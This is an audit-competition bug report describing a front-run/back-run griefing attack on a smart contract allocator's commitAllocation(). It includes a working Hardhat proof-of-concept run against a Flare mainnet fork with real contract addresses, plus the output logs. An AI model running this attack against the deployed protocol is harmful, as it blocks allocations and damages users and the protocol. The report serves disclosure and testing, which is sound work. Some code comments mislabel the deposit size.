# 89834 sc medium an attacker can grief commitallocation when the matchingcapacity is calculated at block timestamp periodstart timestamp&#x20;

**Submitted on Aug 21st 2026 at 12:18:52 UTC by @OxG0P1 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89834
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/CoverOrderAllocator.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief / Introduction

Any user with sufficient assets can cause `commitAllocation()` to revert by manipulating the `totalAssets()` of the `FirelightVault` around the time the off-chain matching engine calculates `matchingCapacity`.

Specifically, an attacker can **front-run the matching engine's calculation** by depositing assets into the vault, temporarily inflating `totalAssets()`. The matching engine then fetches `totalAssetsAt(periodStart)` and calculates an inflated `matchingCapacity` based on this value.

The attacker can subsequently **back-run the matching engine's transaction** by redeeming the shares obtained from the deposit, reducing `totalAssets()` back to its original value.

Later, when the `ALLOCATOR` calls `commitAllocation()`, the on-chain calculation of `maxCapacity` uses the now-reduced `totalAssetsAt(periodStart)`. As a result, the `matchingCapacity` calculated off-chain can be greater than the `maxCapacity` calculated on-chain, causing `commitAllocation()` to revert.

This allows an attacker to prevent allocations from being committed by manipulating the vault's assets during the matching-capacity calculation.

## Vulnerability Details

Consider the following scenario:

* The current period is `5`.
* `periodStart = X`.
* The current timestamp is `X`.
* `vault.totalAssets() = 1000`.
* `vault.totalSupply() = 1000`.

At this point, the matching engine needs to calculate the `matchingCapacity`. To do so, it calls:

```solidity
vault.totalAssetsAt(periodStart)
```

### Step 1 — Attacker Front-Runs the Matching Engine

Before the matching engine's transaction executes, the attacker deposits `500` assets into the vault.

As a result:

```
totalAssets = 1500
totalSupply = 1500
```

The matching engine's call to:

```solidity
vault.totalAssetsAt(periodStart)
```

now observes the inflated `totalAssets` value of `1500`.

Consequently, the matching engine calculates an inflated `matchingCapacity`.

### Step 2 — Attacker Back-Runs the Matching Engine

Immediately after the matching engine's transaction, the attacker redeems the `500` assets they previously deposited.

This brings the vault back to approximately:

```
totalAssets = 1000
```

The matching engine, however, has already calculated `matchingCapacity` using the inflated `1500` asset value.

### Step 3 — `commitAllocation()` Is Called

Suppose the `ALLOCATOR` calls `commitAllocation()` at timestamp `X + 10`.

The function calculates `maxCapacity` using the current value returned by:

```solidity
totalAssetsAt(periodStart)
```

which now returns `1000`.

Assume both the matching engine and the on-chain contract use the following formula:

```
(((FLBBalance + totalAssetsAt(periodStart)) * Leverage) / minCAR)
    * ((10000 + divergenceToleranceBps) / 10000)
```

Since all parameters other than `totalAssetsAt(periodStart)` remain unchanged, the matching engine calculates `matchingCapacity` using the inflated value of `1500`, while `commitAllocation()` calculates `maxCapacity` using the reduced value of `1000`.

Therefore:

```
matchingCapacity > maxCapacity
```

This causes the following validation to revert:

```solidity
function _validateMatchingCapacity(
    CoverOrderAllocatorStorage storage $,
    uint256 period,
    uint256 matchingCapacity,
    uint256 totalAllocated
) private view {
    uint256 maxCapacity = _computeAvailableCapacity($, period);

    if (matchingCapacity > maxCapacity)
        revert MatchingCapacityOverflow(matchingCapacity, maxCapacity);

    if (totalAllocated > matchingCapacity)
        revert TotalAllocationOverflow(totalAllocated, matchingCapacity);
}
```

The transaction therefore reverts with:

```
MatchingCapacityOverflow(matchingCapacity, maxCapacity)
```

Note : Even if the `matchingCapacity` calculation off chain slightly differes from the onchain calculation an attacker can with enough capital still grief `commitAllocation` as long as the calculation happens when the current timestamp is == `periodStart` timestamp by inflating/deflating totalAssets().

## Impact Details

An attacker can temporarily manipulate the vault's `totalAssets()` by depositing assets immediately before the matching engine calculates `matchingCapacity` and then redeeming those assets immediately afterward.

Because the off-chain matching engine and the on-chain `commitAllocation()` can observe different `totalAssetsAt(periodStart)` values, the resulting `matchingCapacity` can exceed the on-chain `maxCapacity`.

This causes `commitAllocation()` to revert and can therefore **prevent the allocation from being committed for the affected period**.

The attack does not require the attacker to permanently transfer assets to the vault; the attacker only needs sufficient capital to temporarily inflate the vault's assets around the matching-capacity calculation.

## References

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L394-L403>

## Proof of Concept

## Proof of Concept

Run

```bash
FORK=1 NODE_RPC_URL=https://flare-api.flare.network/ext/C/rpc npx hardhat test test/fork_capacity_withdraw_poc.js
```

```solidity

const { ethers, upgrades, network } = require('hardhat')
const { time } = require('@nomicfoundation/hardhat-network-helpers')
const { expect } = require('chai')

// Run against a Flare mainnet fork with:
//   FORK=1 NODE_RPC_URL=https://flare-api.flare.network/ext/C/rpc \
//   npx hardhat test test/fork_capacity_withdraw_poc.js
//
// The ProxyAdmin owner is impersonated automatically. The deployed FAsset is
// called through its mint interface to fund the fresh staker directly.
const VAULT_ADDRESS = '0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3'
const VAULT_PROXY_ADMIN = '0x15f89292cef63405a53ab806966681ecb430df85'
const VAULT_PROXY_ADMIN_OWNER = '0xf811e83b45d8de67858efa3ac1202a8b46b8d0b3'

const BPS = 10_000n
const CANONICAL_DECIMALS = 18n
const YEAR = 365n * 24n * 60n * 60n

const scaleToCanonical = (amount, decimals) => {
    if (decimals === 18) return amount
    return amount * 10n ** BigInt(18 - decimals)
}

const formatCanonical = (amount) => ethers.formatUnits(amount, Number(CANONICAL_DECIMALS))

async function impersonate(address) {
    await network.provider.send('hardhat_impersonateAccount', [address])
    await network.provider.send('hardhat_setBalance', [address, '0x3635C9ADC5DEA00000'])
    return ethers.getSigner(address)
}

async function loadProxyAdminOwner() {
    return impersonate(VAULT_PROXY_ADMIN_OWNER)
}

async function freshFundedSigner() {
    const wallet = ethers.Wallet.createRandom().connect(ethers.provider)
    await network.provider.send('hardhat_setBalance', [wallet.address, '0x3635C9ADC5DEA00000'])
    return wallet
}

async function mineTransactionsAt(timestamp, transactions) {
    await network.provider.send('evm_setAutomine', [false])
    try {
        const sentTransactions = []
        for (const transaction of transactions) sentTransactions.push(await transaction())
        await network.provider.send('evm_setNextBlockTimestamp', [Number(timestamp)])
        await network.provider.send('evm_mine')
        return Promise.all(sentTransactions.map((transaction) => transaction.wait()))
    } finally {
        await network.provider.send('evm_setAutomine', [true])
    }
}

async function computeMatchingCapacity(vault, asset, price, config, periodStart, assetsOverride) {
    const assetDecimals = Number(await asset.decimals())
    const bufferToken = await ethers.getContractAt('IERC20Metadata', config.firstLossBufferToken)
    const bufferDecimals = Number(await bufferToken.decimals())
    const firstLossBuffer = await bufferToken.balanceOf(config.firstLossBuffer)
    const assetsAtStart = assetsOverride ?? await vault.totalAssetsAt(periodStart)

    const firstLossBufferCanonical = scaleToCanonical(firstLossBuffer, bufferDecimals)
    const assetsCanonical = scaleToCanonical(assetsAtStart, assetDecimals)
    const stakedValueCanonical = assetsCanonical * price / 10n ** 18n
    const collateral = firstLossBufferCanonical + stakedValueCanonical
    const strictCapacity = collateral * config.effectiveLeverage / config.minCAR

    return {
        capacity: strictCapacity * (BPS + config.divergenceToleranceBps) / BPS,
        assetsAtStart,
        firstLossBuffer,
    }
}

(describe)('Flare mainnet fork: capacity snapshot withdrawal PoC', function () {
    it('accepts period-start capacity after a 10% deposit and full redemption', async function () {
        this.timeout(180_000)
        if ((await ethers.provider.getCode(VAULT_ADDRESS)) === '0x') this.skip()

        const [deployer, curator, allocatorRole, configAdmin, adminRole] = await ethers.getSigners()
        const firstLossBuffer = deployer.address

        const upgrader = await loadProxyAdminOwner()
        const FirelightVault = await ethers.getContractFactory('FirelightVault', upgrader)
        const implementationBeforeUpgrade = await upgrades.erc1967.getImplementationAddress(VAULT_ADDRESS)
        console.log(`vault implementation before upgrade: ${implementationBeforeUpgrade}`)
        const implementation = await FirelightVault.deploy()
        await implementation.waitForDeployment()
        const proxyAdmin = await ethers.getContractAt(
            ['function upgradeAndCall(address proxy, address implementation, bytes data) payable'],
            VAULT_PROXY_ADMIN,
            upgrader,
        )
        const initializeV2Data = new ethers.Interface(['function initializeV2()']).encodeFunctionData('initializeV2')
        const upgradeTransaction = await proxyAdmin.upgradeAndCall(
            VAULT_ADDRESS,
            await implementation.getAddress(),
            initializeV2Data,
        )
        await upgradeTransaction.wait()
        const implementationAfterUpgrade = await upgrades.erc1967.getImplementationAddress(VAULT_ADDRESS)
        console.log(`vault implementation after upgrade: ${implementationAfterUpgrade}`)
        const vault = await ethers.getContractAt('FirelightVault', VAULT_ADDRESS, deployer)
        console.log(`vault contract version after upgrade: ${await vault.contractVersion()}`)

        const asset = await ethers.getContractAt('IERC20Metadata', await vault.asset())
        const assetDecimals = Number(await asset.decimals())
        const staker = await freshFundedSigner()
        const fAsset = await ethers.getContractAt(
            [
                'function assetManager() view returns (address)',
                'function mint(address account, uint256 amount)',
            ],
            await asset.getAddress(),
        )
        const assetManagerAddress = await fAsset.assetManager()
        const assetManager = await impersonate(assetManagerAddress)

        const PriceFeed = await ethers.getContractFactory('FtsoChainlinkAdapter', deployer)
        const priceFeed = await PriceFeed.deploy(
            deployer.address,
            3 * 24 * 60 * 60,
            deployer.address,
            '0x015852502f55534400000000000000000000000000',
            'XRP / USD',
        )
        await priceFeed.waitForDeployment()

        const CoverNFT = await ethers.getContractFactory('CoverNFT', deployer)
        const coverNFT = await upgrades.deployProxy(
            CoverNFT,
            ['Fork PoC Cover', 'FPOC', '', deployer.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
            { kind: 'transparent' },
        )
        await coverNFT.waitForDeployment()

        const market = ethers.encodeBytes32String('flare-fork-poc')
        const protocol = 'ForkPoC'
        const marketId = ethers.keccak256(
            ethers.AbiCoder.defaultAbiCoder().encode(['uint64', 'string', 'bytes32'], [14, protocol, market]),
        )

        const Allocator = await ethers.getContractFactory('CoverOrderAllocator', deployer)
        const allocator = await upgrades.deployProxy(
            Allocator,
            [{
                vault: await vault.getAddress(),
                premiumCollector: deployer.address,
                coverNFT: await coverNFT.getAddress(),
                priceFeedAdapter: await priceFeed.getAddress(),
                maxPriceAge: 30 * 24 * 60 * 60,
                premiumTokens: [await asset.getAddress()],
                admin: deployer.address,
                adminRole: adminRole.address,
                curatorRole: curator.address,
                allocatorRole: allocatorRole.address,
                configAdminRole: configAdmin.address,
                initialProtocolConcentrations: [{ chainId: 14, protocol, maxProtocolConcentrationBps: 10_000 }],
                newMarkets: [{ chainId: 14, protocol, market }],
                capacityConfig: {
                    minCAR: 12_000,
                    firstLossBufferToken: await asset.getAddress(),
                    firstLossBuffer: firstLossBuffer,
                    effectiveLeverage: 24_000,
                    minOrderMarketCoverAmount: 1,
                    divergenceToleranceBps: 500,
                },
            }],
            { kind: 'transparent' },
        )
        await allocator.waitForDeployment()
        await coverNFT.grantRole(await coverNFT.MINTER_ROLE(), await allocator.getAddress())
        const firstLossBufferBalance = await asset.balanceOf(firstLossBuffer)
        if (firstLossBufferBalance !== 0n) throw new Error('PoC first-loss buffer must have zero balance')

        const currentPeriod = await vault.currentPeriod()
        const targetPeriod = currentPeriod + 1n
        const coverAmount = 1n * 10n ** CANONICAL_DECIMALS
        await allocator.connect(curator).createCoverOrder(
            staker.address,
            staker.address,
            'flare-fork-poc',
            await asset.getAddress(),
            [{ marketId, coverRateAnnual: 500, coverAmount }],
            0,
        )

        // Fund and approve before the boundary. Any mined transaction after the
        // boundary would advance the parent timestamp past periodStart.
        const tvlBeforeDeposit = await vault.totalAssets()
        const depositAmount = tvlBeforeDeposit / 50n
        if (depositAmount === 0n) throw new Error('Vault TVL is too small for a 10% deposit')
        await fAsset.connect(assetManager).mint(staker.address, depositAmount)
        const stakerAssetBalance = await asset.balanceOf(staker.address)
        if (stakerAssetBalance < depositAmount) throw new Error('FAsset mint did not fund the independent staker')
        await asset.connect(staker).approve(await vault.getAddress(), depositAmount)

        const nextPeriodStart = await vault.currentPeriodEnd()
        await time.increaseTo(nextPeriodStart - 1n)
        const period = targetPeriod
        const periodStart = nextPeriodStart
        console.log(`periodStart: ${periodStart}`)

        // Prepare funding before periodStart. After the boundary, only the
        // deposit and redemption transactions may be mined.
        const stakerShares = await vault.previewDeposit(depositAmount)
        const assetsAtTimestampBeforeDeposit = await vault.totalAssetsAt(periodStart)
        const assetsAtPeriodStartBeforeDeposit = await vault.totalAssetsAt(periodStart)
        if (stakerShares === 0n) throw new Error('Independent staker would receive zero vault shares')
        const [depositReceipt] = await mineTransactionsAt(periodStart, [
            () => vault.connect(staker).deposit(depositAmount, staker.address),
        ])
        const depositBlock = await ethers.provider.getBlock(depositReceipt.blockNumber)
        const assetsAtTimestampAfterDeposit = await vault.totalAssetsAt(depositBlock.timestamp)
        const assetsAtPeriodStartAfterDeposit = await vault.totalAssetsAt(periodStart)
        console.log(`TVL before deposit (raw): ${tvlBeforeDeposit}`)
        console.log(`deposit amount (raw): ${depositAmount}`)
        console.log(`deposit block.timestamp: ${depositBlock.timestamp}`)
        console.log(`totalAssetsAt(block.timestamp) before deposit (raw): ${assetsAtTimestampBeforeDeposit}`)
        console.log(`totalAssetsAt(block.timestamp) after deposit (raw): ${assetsAtTimestampAfterDeposit}`)
        console.log(`totalAssetsAt(periodStart) before deposit (raw): ${assetsAtPeriodStartBeforeDeposit}`)
        console.log(`totalAssetsAt(periodStart) after deposit (raw): ${assetsAtPeriodStartAfterDeposit}`)

        // Calculate against the inflated live TVL before the staker redeems.
        const config = await allocator.getCapacityConfigAt(period)
        const liveAssetsAfterDeposit = tvlBeforeDeposit + depositAmount
        const [, livePrice, , livePriceUpdatedAt] = await priceFeed.latestRoundData()
        console.log(`XRP/USD live price (raw 1e18): ${livePrice}`)
        console.log(`XRP/USD price updatedAt: ${livePriceUpdatedAt}`)
        const postDepositSnapshot = await computeMatchingCapacity(
            vault,
            asset,
            livePrice,
            config,
            periodStart,
            liveAssetsAfterDeposit,
        )
        console.log(`matchingCapacity (canonical): ${postDepositSnapshot.capacity}`)

        // Redemption is mined at the same timestamp as the deposit, but only
        // after matchingCapacity has been calculated from the deposit state.
        const assetsAtPeriodStartBeforeRedeem = assetsAtPeriodStartAfterDeposit
        const [redeemReceipt] = await mineTransactionsAt(periodStart, [
            () => vault.connect(staker).redeem(stakerShares, staker.address, staker.address),
        ])
        const redeemBlock = await ethers.provider.getBlock(redeemReceipt.blockNumber)
        const assetsAtPeriodStartAfterRedeem = await vault.totalAssetsAt(periodStart)
        const remainingShares = await vault.balanceOf(staker.address)
        if (remainingShares !== 0n) throw new Error('Independent staker still owns vault shares')
        console.log(`redeem block.timestamp: ${redeemBlock.timestamp}`)
        console.log(`totalAssetsAt(periodStart) after redeem (raw): ${assetsAtPeriodStartAfterRedeem}`)
        if (assetsAtPeriodStartAfterRedeem < tvlBeforeDeposit || assetsAtPeriodStartAfterRedeem > tvlBeforeDeposit + 1n) {
            throw new Error('Period-start totalAssets snapshot changed beyond redemption rounding')
        }

        // The live capacity is back to the period-start collateral, so the
        // post-deposit matching capacity must be rejected.
        await time.increase(60)
        const totalCapacitySnapshot = await computeMatchingCapacity(
            vault,
            asset,
            livePrice,
            config,
            periodStart,
            assetsAtPeriodStartAfterRedeem,
        )
        const capacityDifference = postDepositSnapshot.capacity - totalCapacitySnapshot.capacity
        console.log(`capacity immediately before commit (canonical): ${totalCapacitySnapshot.capacity}`)
        console.log(`matching capacity submitted to commit (canonical): ${postDepositSnapshot.capacity}`)
        console.log(`capacity difference (matching - available, canonical): ${capacityDifference}`)
        await expect(
            allocator.connect(allocatorRole).commitAllocation(
                period,
                ethers.keccak256(ethers.toUtf8Bytes('flare-fork-withdraw-poc')),
                0,
                postDepositSnapshot.capacity,
            ),
        ).to.be.revertedWithCustomError(allocator, 'MatchingCapacityOverflow')
        console.log('commitAllocation reverted with MatchingCapacityOverflow')
    })
})

```

\###Logs

```solidity


  Flare mainnet fork: capacity snapshot withdrawal PoC
vault implementation before upgrade: 0x70CCf1bEE0c1217069FE74083Ca71AF7BCd7fb76
vault implementation after upgrade: 0x42269f411B030391634DAB7503b9E2ADE7057F1A
vault contract version after upgrade: 2
periodStart: 1787319769
TVL before deposit (raw): 56624961770953
deposit amount (raw): 1132499235419
deposit block.timestamp: 1787319769
totalAssetsAt(block.timestamp) before deposit (raw): 56624961770953
totalAssetsAt(block.timestamp) after deposit (raw): 57757461006372
totalAssetsAt(periodStart) before deposit (raw): 56624961770953
totalAssetsAt(periodStart) after deposit (raw): 57757461006372
XRP/USD live price (raw 1e18): 1355268000000000000
XRP/USD price updatedAt: 1787314278
matchingCapacity (canonical): 164381361192685912161600000
redeem block.timestamp: 1787319769
totalAssetsAt(periodStart) after redeem (raw): 56624961770954
capacity immediately before commit (canonical): 161158197247734299911200000
matching capacity submitted to commit (canonical): 164381361192685912161600000
capacity difference (matching - available, canonical): 3223163944951612250400000
commitAllocation reverted with MatchingCapacityOverflow
    ✔ accepts period-start capacity after a 10% deposit and full redemption (110999ms)


  1 passing (2m)
```
